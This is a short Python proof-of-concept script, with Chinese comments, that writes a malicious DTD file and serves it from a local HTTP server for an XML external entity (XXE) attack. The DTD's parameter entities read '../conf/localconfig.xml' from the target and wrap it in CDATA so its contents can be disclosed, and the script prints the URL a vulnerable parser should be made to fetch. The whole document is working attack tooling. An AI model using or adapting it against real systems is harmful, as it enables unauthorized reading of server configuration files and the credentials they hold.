import http.server
import socketserver

# 生成poc.dtd文件内容
content = '''<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents \'%start;%file;%end;\'>">'''

with open('poc.dtd', 'w') as f:
    f.write(content)

# 启动HTTP服务器
PORT = 8000

Handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print("HTTP服务器已启动在端口", PORT)
    print("可以通过 http://<你的IP地址>:8000/poc.dtd 访问 poc.dtd 文件")
    httpd.serve_forever()
